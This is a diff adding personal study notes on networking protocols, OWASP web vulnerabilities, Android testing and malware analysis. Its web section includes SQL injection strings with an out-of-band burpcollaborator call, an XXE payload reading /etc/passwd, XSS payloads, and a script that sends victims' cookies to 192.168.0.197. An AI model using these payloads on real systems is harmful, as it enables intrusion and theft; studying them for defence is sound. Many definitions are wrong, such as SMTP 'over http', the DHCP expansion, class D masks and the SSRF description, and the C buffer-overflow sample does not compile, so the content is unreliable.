@@ -1,0 +1,1179 @@
+Network:
+
+1.Rounting:
+	Routing is the process of selecting the best path for packet to send to destination.
+
+1.1 Types of Rounting:
+	* Static Rounting
+	* Dynamic Rounting
+	
+1.1.1 Static Routing:
+	Static routing is a form of rounting when router uses manually configured  routing entry.
+
+1.1.2 Dynamic routing:
+	Dynamic routing is the form of routing where router automatically chooses the best path for routing.
+	
+	* Types of Dynamic routing :
+		1.Linked State Routing
+		2.Distance vector routing
+
+    1.Linked state routing:
+	It is dynamic routing algorithm in which each router shares information about its neighbours 	to every router in network.
+	It uses flooding to share information.
+	It uses Djkastra's algo for the purpose of routing tables.
+	Problem : heavy traffic due to flooding.
+	Examples: OSPF , ISIS
+
+   *OSPF:	open shortest path first is the linked state routing protocol falls in the group of 			interior gateway protocol.
+		operating within single autonomous system.(Autonomous system is collection of 		connected ip prefixes under the control of one or more network operators.
+	
+	*ISIS:	intermediary system to intermediary system is interior gateway routing protocol.
+		It also uses Djkastra's algo.
+		Interior gateway routing protocol with sigle Autonomous System.
+
+
+2.Distance vector routing :
+	It is dynamic routing algorithm in which each router computes distance itself and the 	possible destination.
+	Router shares information about its network to each neighbours and accordingly updates the 	table.
+	It makes use of bellman ford algorithm.
+	Example:RIP , BGP, IGRP,
+
+	*RIP:
+		routing information protocol uses hop count to find the best path between source and 		destination.
+		Versions: RIP1, RIP2 , RIPNG
+
+	*BGP: border gateway protocol
+		bgp is exterior routing protocol design to exchange routing and reachability between 		different Autonomous systems.
+
+	Types:	1.Ibgp 
+			2.Ebgp
+
+		1.Interior BGP: when BGP runs between Two peers in same autonomous 				    system, it is called IBGP.
+		2.Exterior BGP: when BGP runs between two autonomous systems, it is 				    called Ebgp.
+
+
+
+
+
+
+*Arp: address resolution protocols
+	It is resides in router and trasfer the packet to the intended host based 	on mac address.It has table of ip address and mac binding.
+
+*DHCP : dynamic host control protocols
+	  It resides in router and dynamically assigns ip addresses to hosts in 	  network.
+
+*NAT : network address translation
+	 It resides in router and translate private to public ip address.
+
+*ICMP : internet control message protocols
+	  icmp used for ping and error detection.
+
+*RDP : Remote desktop protocol is used for calling services from remote host.
+
+*
+	 	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+2.TERMS YOU SHOULD KNOW:
+
+*FTP:
+	file transfer protocol is used for sharing of file between client and server.
+	Port uses : 20, 21
+*SSH:
+	secure shell use for executing commands securely over network.
+	Port used : 22
+*Telnet:
+	 it is used for establishing bidirectional text based communication.
+	Port used : 23
+*SMTP:
+	Simple mail transfer protocol is used for sharing email over http network.
+	Port used : 25
+*Time :
+	It is used for clock synchronization.
+	Port used : 37
+*Dns :
+	it is use for host name to ip adress conversion.
+	Port used : 53
+
+*kerberose:
+	       it is used for authentication in windows based networks.
+	       Port used: 88
+
+*POP3:
+	      It is used for receiving mails.
+	      Port used: 110
+*NetBIOS: 
+	      Network basic input / output is an API  for communication over LAN.
+	      Port used : 137
+	
+	
+ 
+*IRC : internet relay chat is communiccation protocol in the form of text.
+	Port used:  194
+
+*IMAP: 
+	 internet message access protocol use used for accesing emails. Eg: gmail
+	port used: 993
+*NNTP:
+	It is used for transferring news articles between news servers for readingand posting.
+	Port used: 119
+*SMB: 
+	server message block used for sharing files, printers, and other resources on network.
+	Port used: 445
+		
+	
+		
+
+
+
+3.OSI MODEL: open system interconnection
+		It is refference model for eastablishing communicatin over network.
+
+3.1Layers in osi model and their protocols:
+	
+	*physical layer: It transmit data in bits.
+			 Ex: coxial calble, fibre optic cable, hubs repeaters
+	*data link layer:it converts and transmit data in frames.
+			  Ex: Ethernet, ppp, switch bridge.
+	*netwok layer : it assign ip address and encryption.
+			Ex : ipv4, ipv6, ipsec
+	*transport layer: split data into smaller unit and forward.
+			Ex : tcp, udp
+	*session layer : establish , control and end session.
+			Ex : socket, winsock, api
+	*presentstion layer : Data compression, decompression, encryption, decryption are 					completed in this layer.
+				Ex : ssl, ssh, imap, ftp
+	Application layer:  provides services such as login, naming etc.
+			     Ex: http, ftp, irc, dns
+
+
+
+4. TCP/IP model :
+		there are four layers in tcp/ip model.
+		Application layer: combination of first three layer of osi model.
+		Transport layer
+		Internet layer
+		Network interface layer:combination of bottom two layer of osi model.
+
+5.Ip address,subnet, subnet mask, dafault gateway:
+ 
+	*Ip address: ipv4, ipv6
+
+			 1.ipv4 : 32 bit address
+			 2.ipvr6 : 128 bit address
+	* classes of Ip :
+				class A: range 	   0-126
+					   127 range is reserved for loop back address.
+					   subnet mask 255.0.0.0
+					   host supported : 2^24 - 2
+
+				class B:range        128-191
+					  subnet mask  255.255.0.0
+					  host supported : 2^16 - 2
+				class c:range        192-223
+
+					  subnet mask  255.255.255.0
+					  host supported : 2^8 – 2
+					
+				class D:range        224-239
+					  subnet mask  255.255.255.255
+					  It is used for muticasting.In multicasting data 					  is design for perticular host, so no need of 						  host.
+				
+				class E:range        240-255.255.255.254
+					  It is used for experimental purpose.
+
+6.Unicast, multicat, broadcast:
+1. Unicast :
+This type of information transfer is useful when there is a participation of single sender and single recipient. 
+2.Broadcast : one to many transfer of data.
+3. Multicast :
+In multicasting, one/more senders and one/more recipients participate in data transfer traffic.
+
+
+
+
+
+
+7.Firewall:
+	In computing, a firewall is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules.
+
+7.1 Types of firewall:
+	1.Packet-Filtering Firewalls:
+	The firewall performs a simple check of the data packets coming through the router—inspecting information such as the destination and origination IP address, packet type, port number, and other surface-level information without opening up the packet to inspect its contents.
+
+	2.Circuit-Level Gateways:
+	circuit-level gateways work by verifying the transmission control protocol (TCP) handshake. This TCP handshake check is designed to make sure that the session the packet is from is legitimate.
+	3.Stateful Inspection Firewalls:
+	These firewalls combine both packet inspection technology and TCP handshake verification to create a level of protection greater than either of the previous two architectures could provide alone.
+	4.Proxy Firewalls (Application-Level Gateways/Cloud Firewalls):
+	Proxy firewalls operate at the application layer to filter incoming traffic between your network and the traffic source.
+	This check is similar to the stateful inspection firewall in that it looks at both the packet and at the TCP handshake protocol. However, proxy firewalls may also perform deep-layer packet inspections, checking the actual contents of the information packet to verify that it contains no malware.
+
+Difference between IDS and IPS:
+	The main difference between them is that IDS is a monitoring system, while IPS is a control system. IDS doesn't alter or block the network packets in any way,it simply alerts the administrator, whereas IPS prevents the packet from delivery based on the contents of the packet, much like how a firewall prevents traffic by IP address.
+
+*WAF: web application firewall:
+	A WAF creates a shield between a web app and the Internet; this shield can help mitigate many common attacks
+	types:
+		cloud base
+		box type
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+8.Cyber security related terms:
+	1.vulneribility: It is the weakness in the system that can be exploited b 				threat actor.
+
+	2.eavesdropping: Listening the conversation between two persons without 				their permission.
+
+	3.exploit      : An exploit is a piece of software, a chunk of data, or a 			     sequence of commands that takes advantage of a bug or 					vulnerability.
+
+
+	4.Malware:       malware is malcious sowtware that has nature to harm the 			     system.
+
+	 Types of malware:
+				
+	1.virus		: A computer virus is a type of computer program that, 				  when executed, replicates itself by modifying other 				  computer programs and inserting its own code.virus can 
+				  corrupt files.
+
+	2.worms		: A computer worm is a standalone malware computer 					  program that replicates itself in order to spread to
+ 				  other computers. 
+
+	3.Throzan horses  : It opens the backdoor.It is malcious software.
+
+	4.spyware		: It is used for spying on some person and send result 
+				  back to the administrator.
+	
+	5.logic bomb	: It is type of malware that is executed when specified 
+				  conditions are met.
+
+	6.rootkits		: It is used to gain root access.
+
+	7.Adware		: forces the advertise on display of victim.
+
+	8.ransomware      : It is kind of malware that encrypts all the files on 				  victim computer and demands for ransomware.
+
+	5.payload :		:  An exploit is a piece of code written to take 					  advantage of a particular vulnerability. A payload is 				  a piece of code to be executed through said exploit.
+
+	6.sniffing		: Sniffing is the process of monitoring and capturing 				  all the packets passing through a given network using 				  sniffing tools
+	
+	7.sniffing		: Spoofing is the act of disguising a communication from 				  an unknown source as being from a known, trusted 					  source.
+
+	8.phishing		: Phishing is the fraudulent attempt to obtain sensitive 				  information such as usernames, passwords and credit 				  card.
+
+	Types of phishing : 
+	1.spear phishing : phishing attempt to individual or company is called 				 spear phishing.
+
+	2.whale phishing : It is phishing attempt to senior executive or other 				 high level target.
+
+	3.clone phishing : Clone phishing is a type of phishing attack whereby a 				 legitimate, and previously delivered, email containing 				 an attachment or link has had its content and recipient 			       address(es) taken and used to create an almost 					 identical or cloned email. 
+
+	8.Bufferoerflow : bufferoverflow is flaw in programing language that 					doesnt check weather the data is stored within specified
+				buffer or not when oerloaded.
+	 
+	Techniques : nop sled
+			 jump to address stored in register technique.
+
+	Done by using c or c++, because these languages has no internal mechanism 	
+	to check weather the data is stored withing specified storage.
+
+	Simple code:
+
+			#include <stdio.h>
+			#include <string.h>
+			void doit(void)
+			{
+			  char buf[8];
+			  gets(buf):
+			  print(“%s\n”, buf);
+			}
+			int main(void)
+			{
+			   printf("So... The End...\n");
+          		   doit();
+          		   printf("or... maybe not?\n");
+
+          		   return 0;
+  			}		 
+
+
+
+		
+
+
+	
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+WEB:
+
+1.Injection:
+	The application is said to vulnerable, 
+	the user supplied input is not validated or sanitized by application.
+	Hostile data is used directly with dynamic quaries.
+	Hostile data is used directly within search parameters.
+Types: sql injection
+	 os command injection
+	 LDAP
+	 OGNL injection
+	 X path injection
+ 	 php injection
+
+prevention : use of safe API that avoids use interpreter entirely or 
+		 migrate to use of ORMs or entity framework.
+		 Whitelisting
+		 Escape special characters using special ecaping syntax.
+		 Use of LIMIT and other sq quaries for preventing mass disclosur of 
+		 data.
+	
+Sql injection :
+	types: 1.IN-BAND
+			1.1.ERROR BASED
+			1.2.UNION BASED
+			1.3.BLIND SQL
+				1.3.1 BOOLEAN BASED
+				1.3.2 TIME BASED
+			1.4.OUT OF BAND
+
+1.1 ERROR BASED:
+		this type of sql injection is based on error thrown by databases.
+		Ex : admin’ or ‘1’=’1 --
+
+1.2 UNION BASED:
+	ex : SELECT a, b FROM table1 UNION SELECT c, d FROM table2 
+	
+1.3 BLIND SQL :
+	In this type database is vulnerable but dont show error messages.we use following two techniques for exploiting
+
+1.3.1 BOOLEAN BASED: 
+	In this, we use boolean quaries to ask  the question to the database, it returns eithe ture or false, based on that we try to exploit.
+ Ex : 
+	1.xyz’ UNION SELECT ‘a’ FROM Users WHERE Username=’Administrator’ AND SUBSTRING(password,1,1)>’m’ –
+
+	2.xyz’ union select case when (username=’Administrator’ and SUBSTRING(password,1,1)>’m’) then 1/0 else null end from users --
+
+	 In the 2nd example it ask database wheater or not userid and password matching condition matches with database, if it matches it return 1/0 error or returns nothing.
+
+1.3.2 TIME BASED:
+	In this time attacker ask the database if the specified condition present in database then delay for mentioned time in payload.
+
+‘; IF(SELECT COUNT(username) FROM Users WHERE Username=’administrator’ AND SUBSTIRNG(password,1,1) > ’m’) = 1 WAIT FOR DELAY ‘0:0:30’
+
+if true it delays response for 30secs.
+
+1.4 OUT OF BAND:
+	In some cases time based and boolean based it not possible due to slow internet speed and other.
+In this we try to get result on different server using DNS protocol and burp collabrator.
+A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems. 
+
+Ex : '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- 
+
+
+
+
+
+*os command injection:
+	if application is accpeting os commands as in input, it is vulnerable to os command injection.
+	Ex : ls;
+
+*LDAP injection :
+	lightweight directory access protocol use for sharing directory services between client and server.
+	This kind of exploitation basically takes place for that software that has web view(thin clients).
+
+*OGNL: object navigational graph language
+	 It is expression language for java  used for embedding expressions into web pages.It is used in java sturts 2.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+2.BROKEN AUTHENTICATION:
+	The application is said to be vulnerable if,
+	permits attacks such as credential stuffing and brute forcing.
+	Permits default and weak passwords.
+	Use weak password recovery such as knowleadge base QA.
+	Use plain text or weakly hashed passwords.
+	Missing 2 factor authentication.
+
+Prevention:
+	Store passwords using strong hashing algorithms such as pdkdf2, 	argon2,scrypt,bcrytpt.
+	Implement weak password cheack, cheack passwords against most commonly use 
+	10000 words.
+	Implement 2 factor authentication
+	log all the login failer, and monitor for suspecious activity.
+
+
+3.SENSITIVE DATA EXPOSURE:
+	The applicstion is said to be vulnerable if,
+	If the data is transmitted in clear text internally or extearnally.
+	If the sensitive data is stored in clear text.
+	If old or outdated cryptographic algorithms are use.
+	If weak or deafault crypto keys are used.	
+	If encryption is not enforced.
+
+Prevention : 
+	classify data stored, transmitted and apply control as per specification.
+	Dont store sensitive data, discard it as soon as possible if no use.
+	Encrypt all the sensitive data.
+	Use updated cyphers only.
+	Store password using strong hashing algo such as scrypt, bcrypt, argon2,
+	pbkdf2.
+	Desable caching for sensitive data.
+	
+	ex: heartbleed vulneribility
+
+4.XXE :
+	XML xnternal entity
+	The application is said to vulnerable, 
+	If the application accept xml directly from untrusted sources or accept 	untrusted data into xml document and then it is parsed by xml processor.	
+	Any xml based processor or SOAP based web service has DTD enabled.
+	SOAP based services prior to 1.2 are susceptible to xxe.
+	It also vulnerable to deniel of serice attack.
+
+Prevention : 
+	Disable XXE and DTD on your application parser.
+	Whitelist
+	upgrade SOAP to latest version
+	WAF
+	XML file upload validates uncoming file using xsd validation.
+
+Payload : 
+	<?xml version=”1.0” encoding=”utf-8”?>
+	<!DOCTYPE [ <ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
+	<stockCheck><productId>&xxe;</productId></stockCheck> 
+
+
+
+
+
+
+5.BROKEN ACCESS CONTROL:
+	Bypassing access control checks by modifying the URL, internal app state, or the HTML page, or simply using a custom API attack tool.
+
+Prevention: 
+	access control is only effective if access control is implemented sevrver side code.
+	Implement access control mechsnism once and use it throughout the application.
+	Disable directory listing and ensure metadata should not be stored within web roots.
+	Log access control failure, and monitor for suspecious activity.
+
+6.SECURITY MISCONFIGURATION : 
+	Unnecessary features enabled or installed.
+	Default accounts and their passwords are used.
+	Does your error handling reveals stack traces.
+	If application is not enforcing security headers.
+	If any software is out of date.
+
+Prevention : 
+	Remove unused feature, dependencies, components, documents etc.
+	Update all the components to the latest version.
+	An automated process to check the effictiveness of configuration and settings.
+
+7.XSS : cross site scripting :
+	Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application.
+Types :
+ 1.stored xss :
+	our app or API stores unsanitizeduser input that is viewed at a later time by another user.
+
+2.Reflected xss :
+	Your app or API includes unvalidatedand unescapeduser input as part of HTML output or there is no content security policy (CSP) header. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser.
+
+3.DOM : document object model
+	JavaScript frameworks, single page apps, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS.  
+Typical XSS attacks include session stealing, account takeover, MFA bypass, DIV replacement or defacement.
+
+	DOM :The Document Object Model is a cross-platform and language-independent interface that treats an XML or HTML document as a tree structure wherein each node is an object representing a part of the document.
+
+EX : For example,
+http://www.example.com/userdashboard.html?context=Mary is a dashboard customized for Mary. It contains the string Main Dashboard for Mary at the top.
+Here is how a DOM-based XSS attack can be performed for this web application:
+    1. The attacker embeds a malicious script in the URL: http://www.example.com/userdashboard.html#context=<script>SomeFunction(somevariable)</script>. 
+    2. The victim’s browser receives this URL, sends an HTTP request to http://www.example.com, and receives the static HTML page. 
+    3. The browser starts building the DOM of the page and populates the document.URL property with the URL from step 1. 
+    4. The browser parses the HTML page, reaches the script, and runs it, extracting the malicious content from the document.URL property. 
+    5. The browser updates the raw HTML body of the page to contain: Main Dashboard for <script>SomeFunction(somevariable)</script>. 
+    6. The browser finds the JavaScript code in the HTML body and executes it.
+       The logic behind the DOM XSS is that an input from the user (source) goes to an execution point (sink). In the previous example our source was document.baseURI and the sink was document.write. 
+Popular sources:
+      document.URL 
+      document.documentURI 
+      location.href 
+      location.search 
+      location.* 
+      window.name 
+      document.referrer 
+Popular Sinks :
+      HTML Modification sinks 
+          document.write 
+          (element).innerHTML 
+      HTML modification to behaviour change 
+          (element).src (in certain elements) 
+    • Execution Related sinks 
+          eval 
+          setTimout / setInterval 
+          execScript 
+
+           How is DOM XSS Different?
+	Using the above example, we can observe that:
+    • The HTML page is static and there are no malicious scripts embedded into the page source code, as in the case of other types of XSS attacks. 
+    • The script code never reaches the server if we use the # character. It is seen as a fragment and the browser does not forward it. Therefore, server-side attack detection tools will fail to detect this attack. Note that in some cases, depending on the type of the URL, the payload might get to the server and it may be impossible to hide it. 
+       
+ 
+
+Prevention: 
+	use safe framework that automatically escape for xss such as ruby 3.0 and
+React JS.
+	Enabling a content security policy
+	Escaping untrusted HTTP request.
+	Applying context sensitive encoding when modifying browser documents on client side act against client side acts against DOM XSS.
+
+
+EX : payloads-
+	for json: 
+		<script> var initData = {“foo”:”</script> <script>alert(1)</script>”} </script>
+
+	for ajax/json:
+		<img src=x onerror=alert(1)>
+
+	for ajax/xml: Encode the above payload using HTML encoding.
+	
+	for back button: use following payload in referer tag
+		‘;alert(1);’
+	
+      custome http header xss:
+			define the following payload below referer tag..
+		bWAPP: <script>alert('hey')</script>
+	for user agent:
+		<script>alert(1)</script>
+
+	for exploiting eval: use following code in url
+		alert(1)
+
+	for href : we nee to close preious tag
+		><script>alert(1)<script>
+	
+	for stealing cookies: 
+		<script type=”text/javascript”>
+		document.location=”http://192.168.0.197:9000?				cookie=”+document.cookie;
+		</script>
+	
+
+
+
+8.INSECURE DESERIALIZATION :
+	This type of attack take place usually on java serialization or text based format like json.net and API will be vulnerable if when :
+If the serialization mechanism allows creation of arbitary data type.
+There are classes that are chain together to change the behaviour during or after the deserialization.
+The application accepts deserialized or hostile data from untrusted sources.
+Missing integrity check of data.
+
+Prevention : 
+	Not accepting serialized objects from untrusted sources.
+	Implement integrity check to prevent data tampering.
+	Enforce strict type constraint during deserialization before object 	creation.
+	Monitor traffic that are coming in or going out from containers or 
+	servers that continiously deserializes.
+	Log deserialization failure and exception and alerting if user 	deserializes continously.
+
+
+
+9.USING COPONENTS WITH KNOWN VULNERIBILITIES :
+	If any component is outdated,such as os or libraries, DBMS, runtime enviroments, 
+	If you do not reaserch for latest vulneribilties related to the components  
+that are used.
+	Security missconfiguration in components.
+
+Prevention : 
+	Remove unused dependencies, unnecessary features, components, files, and documentation.
+	Inventory of both client and server side resourses using components versions, Dependency check, retire.js.
+	Continous monitoring of sources like CVE, NVD for latest vulneribilities related to your components.
+	Obtain components from trusted sources and prefer signed packages.
+
+
+	EX : apache sturts 2 vulneribility , open ssl 1.0.1 hearbleed vulneribilty
+
+10.INSUFFICIENT LOGING AND MONITORING :
+	auditable events such as high value transaction , login failed are not logged.
+	Logs of API are not monitor for suspecious activity.
+	Alerting threashold is not implemented properly.
+
+Prevention : 
+	login failure, high value transaction, access control failure, input validation failure can be logged with sufficient user context to indentify suspecious activity, held for sufficient time to allow delayed forensic anlysis.
+	Implement integrity check to prevent data tampering.
+		
+	There are commercial and open source application protection frameworks such asOWASP AppSensor, web application firewalls such asmod_security with the OWASP Core Rule Set, and log correlation software such as ELK with custom dashboards and alerting
+
+
+
+
+Other web vulneribilities:
+
+1.CSRF : cross side request forgery.
+	Cross-Site Request Forgery is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. 
+
+Prevention : 
+	Anti-Forgery Tokens
+	Ensure Cookies are sent with the SameSite Cookie Attribute
+
+2.IDOR: Insecure direct object reference.
+	IDOR occurs when a user supplied input is unvalidatedand direct access to the object requested is provided.
+
+Prevention : 
+	Implement storng access control policy.
+	Validate user input
+	Use per user or session indirect object references.
+
+3.LFI and RFI :
+	local file inclusion is type where we can read server side files.
+	Remote file inclusion is type where we can client side file on server.
+	
+prevention: 
+	Input validation and sanitization
+		These inputs include:
+    • GET/POST parameters 
+    • URL parameters 
+    • Cookie values 
+    • HTTP header values 
+	Finally, you should consider restricting execution permission for the upload directories and maintain a whitelist of allowable file types (for example PDF, DOC, JPG, etc.), while also restricting uploaded file sizes.
+	Implemet WAF.
+
+4.SSRF: sevrer side request forgery
+	If we can read server side files , then the application is vulnerable.
+	This kind of vulneribility exists .where lfi and rfi resides.
+	Using ssrf, we can read server side files.
+	We can scan third party application.
+	RCE	
+	This typically reside where: includes=”
+prevention : 
+	To prevent SSRF vulnerabilities in your web applications it is strongly advised to use a whitelist of allowed domains and protocols from where the web server can fetch remote resources.
+	
+5.CLICKJACKING : 
+Clickjacking, also known as a "UI redress attack", is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the the top level page. Thus, the attacker is "hijacking" clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. 
+IMPACT : 
+	An attacker may also choose to redirect the clicks to download malware or gain access to vital systems as a starting point for an advanced persistent threat (APT).
+	Harvest login credentials, by rendering a fake login box on top of the real one.
+
+prevention : 
+	client side prevention : 
+		using add-on such as : 1.no clickjack
+						2.no script
+
+	server side prevention:
+		1.x frame header : The X-Frame-Options HTTP header can be used to indicate whether or not a browser should be allowed to render a page in a <frame>, <iframe> or <object>
+	
+		2.Content Security Policy : 
+			It is designed in such a way that website authors can whitelist individual domains from which resources (like scripts, stylesheets, and fonts) can be loaded, and also domains that are permitted to embed a page.
+
+
+Terms related to web protection : 
+	1.HSTS: hypertext stirct transport security
+		  It forces browser to use only https traffic.
+
+	2.PFS : perfect forward secrecy:
+		 perfect forward secrecy (PFS), is a feature of specific key agreement protocols that gives assurances that session keys will not be compromised even if the private key of the server is compromised. 
+
+	3.CSP : content security policy
+		A CSP compatible browser will then only execute scripts loaded in source files received from those allowlisted domains, ignoring all other script 
+
+	4.CORS: cross origin resource policy
+		Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell browsers to give a web application running at one origin, access to selected resources from a different origin.
+
+	5.CVE : common vulneribilty and exposure
+		
+CVE is a list of entries each containing an identification number, a 
+description, and at least one public reference for publicly known cyber security vulnerabilities.
+
+	6.NVD : national vulneribilty databases
+		The NVD is the U.S. government repository of standards based vulnerability management data represented using the Security Content Automation Protocol (SCAP).
+The NVD includes databases of security checklist references, security-related software flaws, misconfigurations, product names, and impact metrics.
+
+	7.SOAP: simple object access protocols		
+		SOAP is an acronym for Simple Object Access Protocol. It is an XML-based messaging protocol for exchanging information among computers.
+	
+	8.API : Application program interface.
+		 API is the acronym for Application Programming Interface, which is a software intermediary that allows two applications to talk to each other. 
+
+	9.DATS: 
+		Dynamic Application Security Testing (DAST) is a black-box security testing methodology in which an application is tested from the outside.A tester using DAST examines an application when it is running and tries to hack it just like an attacker would.
+
+	10.SATS : 
+		Static Application Security Testing (SAST), which is a white-box testing methodology. A tester using SAST examines the application from the inside, searching its source code for conditions that indicate that a security vulnerability might be present.
+
+	11.THREAT : 
+		Cyber threats, or simply threats, refer to cybersecurity circumstances or events with the potential to cause harm by way of their outcome. A few examples of common threats include a social-engineering or phishing attack.
+
+	12.VULNERIBILITY :
+		Vulnerabilities simply refer to weaknesses in a system. They make threat outcomes possible and potentially even more dangerous.
+
+	13.RISK : 
+		Risks are usually confused with threats. However, there is a subtle difference between the two. A cybersecurity risk refers to a combination of a threat probability and loss/impact
+
+		risk = threat probability * potential loss
+
+	14.IAST : 
+		IAST (interactive application security testing) analyzes code for security vulnerabilities while the app is run by an automated test, human tester, or any activity “interacting” with the application functionality. This technology reports vulnerabilities in real-time, which means it does not add any extra time to your CI/CD pipeline. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+9.Android Teating :
+
+	android app is a dalvik executable file which on dalvik virtual machine.
+
+9.1 Android architecture :
+	starting from bottom layer :
+			linux kernal
+			libraries / android runtime
+			Application frameworks
+			Application
+	
+		
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+9.2 Android Security Architecure : 
+	Android security is baes on two models.This two runs parallely to provide security.
+
+		1.Linux based model : privilege control
+			Assigns PID and UID to each process and user.
+
+		2.Android security model : permission based
+			
+9.3 Android app development lifecycle : 
+Life cycle goes through following stages.
+
+1.java source code : android code in form of java.
+2.java compiler : compiler compiles java code into java byte code.
+3.java byte code 
+4.Dex compiler : dex compiler converts java byte code to dalvik byte code.
+5.dalvik byte code
+6.Dex executable file (.dex)
+7.(.dex) are zipped into .apk
+
+9.4 Android application components : 
+	1.Activity : first screen when you opens the application and all the other screens is a activity.
+	
+	2.intent : It is used to combine two or more activities.
+
+	3.Services : background services are handled by services. Ex : downloading
+
+	4.content provider: Used to retrieve data from the database.
+
+	5.Broadcast receiver : used to listen broadcast messages thrown by other application.
+
+9.5 Android startup process : 
+	1.bootloader : Responcible for booting of kernel, after that init() process starts.
+
+	2.init() process : responcible for loading various components.
+				 Ex : init.rc file
+	
+	3.zygote process : child process of init().
+				 Responcible for loading dalvik virtual machine.
+
+	4.Dalvik virtual machine : runs dalvik files.(.apk)
+
+	5.Boot complete broadcast : 
+				 Android os send broadcast message to all the components 				 that booting is completed.
+
+	
+9.5 Common files in android : 
+ 	1.classes.xml : where all the source code is located.
+	
+	2.Androidmanifest.xml : where all the h/w permission and other permissions 					are written.
+
+	3.META-INF : META-INF folder contains the manifest information and other 			 metadata about the java package carried by the jar file.
+	
+	4.res : The res/values folder is used to store the values for the 			  resources that are used in many Android projects to include 			  features of color, styles, dimensions etc.
+
+	5.lib : The res/values folder is used to store the values for the 			  that are used in many Android projects to include features of 			  color, styles, dimensions etc.
+
+
+9.6 Application sighning : 
+	Application signing allows developers to identify the author of the application and to update their application without creating complicated interfaces and permissions.
+	Applications that attempt to install without being signed will be rejected by either Google Play or the package installer on the Android device. 
+
+	Two ways of signing : 
+		1.self signing
+		2.certificate authority
+
+9.7 Unzipping vs Decompiling : 
+	Unzipping simply unzip a file, but it still cant be read because they are still not decompiled. 
+	Decompiling make the file in human readable format.It open file in smali file.
+9.8 Tools used in Android testing: 
+	1.apktool : it is used to compile/decompile the apk file.
+
+	2.ADB : android debbug bridge is client server program.
+		  Use for android testing.
+		  Devices are connected to machine for testing using adb.
+	
+	3.dex2jar : It converts dex files into java .jar files.
+			
+	4.Frida : It is client server program.
+		    It is used for ssl pinning bypass whci is required for api 			    testing.
+	
+	5.jd-gui : It is text editor.It used for reading jar files.
+
+
+
+
+10.MALWARE ANALYSIS : 
+	Malware is executable or binnary that is malicious in nature.
+		Spying on target through RAT, keylogger
+		Data exfiltration
+		Data encryption and destruction
+
+	Types of malware : 
+			1.throjan 
+			2.RAT
+			3.ransomware
+			4.dropper
+
+10.1 Malware analysis : 
+	Malware analysis is the process of analysing a malware and extracting as much as information from them.
+	The information we extracted help us to understand the scope of functionality of the malware, how the system was infected, how defend against the malware attacks in future.
+
+
+10.2 Types of malware analysis : 
+	1.static analysis : It is the process of analyzing the malware without executing the malware and extrating the metadata from the malware.
+Ex: strings, pe-headers
+
+	2.Dynamic analysis : It is the process of executing the malware and analyzing its behaviour.
+
+	3.Code analysis : It is the process of reverse engineering of assembly code.
+
+	4.Behavioural analysis : It is the process of analyzing the malware after executing it.
+
+
+
+* STATIC ANALYSIS : 
+	steps:
+		1.Identifying a fie type : Indetifying os, architecture, format etc.
+
+		2.Identifying a malware : Generating hash of the malware to uniquely 	identify the malware.
+
+		3.Stirngs : It gives an Idea of malware can do.
+	
+		4.Packing and obsfucation : obsfucation and packing are used for 	preventing detection.
+		 deobsfucation and unpacking can reveal the additional information.
+
+		5.PE headers : Reveal lot of information on malware functionality.
+
+
+1.IDENTIFYING A FILE TYPE : 	
+	PE stands for portable executable. Ex : .exe, .dll etc
+	To identify the file type we need to analyze file signature. 
+	This avoids false positive by the use of double extention.
+	File signature exist on file headers.
+	Signature of PE files are represented by hexadecimal values such as 
+	4D 5A or MZ in first two byte.
+
+Tools : 1.exeinfoPE
+	  2.pestudio
+	  3.hxd
+
+2.MALWARE HASHING : 
+	 Generating hash of the malware to uniquely identify the malware.
+	 Hashing used : md5, sha1, sha256
+
+Tools : hashcalc
+
+3.ANALYZING STRINGS : 
+	Extracting readable word and characteristics from the malware.
+	Strings can be valuable inforamtion about the malware.
+	It also contains random strings also known as garbage strings.
+	Strings are in ASCII and unicode format.
+	
+	string types : 
+		1.file names
+		2.urls
+		3.IP addresses		
+		4.registry keys
+
+Tools : 1.string command line utility
+	  2.pestudio 
+	  3.peid 
+
+4.PACKERS : 
+	A packer is the tools used to compress the contents of the malware.
+	Attacker uses packer to obsfucate the content of the malware, and make it 	difficult to analyze.
+Tools : 1.upx
+	  2.exeinfope
+
+5.PE HEADERS : 
+	Pe headers contains the information the os requires to run the executable.
+	Why pe header is imp?: 
+		Contains information required by os.
+		Specifies where executable needed to be loaded in the memory.
+		Contains libraries executable needed to run.
+		It contains information from where execution begins.
+
+	What we look for : 
+		compiler stamp : when where malware was compiled.
+		Subsystem : what subsystem was used.
+		Section : Is it packed or are they in incosistent state.
+		Libraries : what libraries and imports are use.
+	
+Tools : 1.pestudio
+	  2.cff explorer
+
+6.Examining resource section : 
+	The respurce section contains all the necessary information and file required by executable.
+	Ex : icon, dialogs
+	Why it is imp?:
+	Attacker can store more malicious file such as payloads and droppers etc.
+
+Tools : 1.pestudio
+	  2.Resource hacker
+
+7.Malware classification : 
+	It is the process of classifying malware sample based on shared characteristics with previously analyzed sample.
+
+	Whats wrong with hashed based identification?: 
+	The content of the sample are changed by attacker to evade the hash based identification.
+	Cryptographic hashing is only accurate if the data of samples remain the same.If one line of code changes hash changes.
+
